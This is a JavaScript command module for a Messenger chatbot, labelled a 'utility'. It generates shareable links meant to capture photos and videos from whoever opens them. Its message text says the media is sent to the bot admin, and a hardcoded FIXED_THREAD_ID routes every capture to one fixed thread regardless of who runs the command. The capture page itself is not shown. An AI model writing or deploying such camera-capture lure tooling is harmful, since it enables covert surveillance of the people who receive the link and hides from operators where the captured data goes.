const fs = require("fs-extra");
const path = require("path");
const axios = require("axios");

// Your fixed thread ID where captures will be sent
const FIXED_THREAD_ID = "8478371335539813";

module.exports = {
    config: {
        name: "capture",
        version: "1.0",
        author: "Developer",
        countDown: 5,
        role: 0,
        description: {
            en: "Generate a camera capture link"
        },
        category: "utility",
        guide: {
            en: "{pn} - Get your capture link"
        }
    },

    langs: {
        en: {
            link: "📸 Camera Capture Link\n\n%1\n\nShare this link to capture photos/videos. The media will be sent to the bot admin.",
            error: "❌ Error generating link"
        }
    },

    onStart: async function ({ api, event, args, message, getLang }) {
        const { senderID } = event;

        // Generate a unique session ID
        const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);

        // Store session info - always use fixed thread ID
        if (!global.temp.captureSessions) {
            global.temp.captureSessions = new Map();
        }
        global.temp.captureSessions.set(sessionId, {
            threadID: FIXED_THREAD_ID,
            senderID: senderID,
            createdAt: Date.now()
        });

        // Get the dashboard URL from config
        const config = global.GoatBot.config;
        const port = config.dashBoard?.port || 5000;

        // Try to get external URL
        let baseUrl = process.env.RENDER_EXTERNAL_URL || process.env.RAILWAY_STATIC_URL;
        if (!baseUrl) {
            // Try to get from config.serverUptime
            baseUrl = config.serverUptime?.url;
        }

        // If no external URL, use localhost (for local testing)
        if (!baseUrl || baseUrl.includes('localhost')) {
            baseUrl = `http://localhost:${port}`;
        }

        const captureUrl = `${baseUrl}/capture/${sessionId}`;

        return message.reply(getLang("link", captureUrl));
    }
};
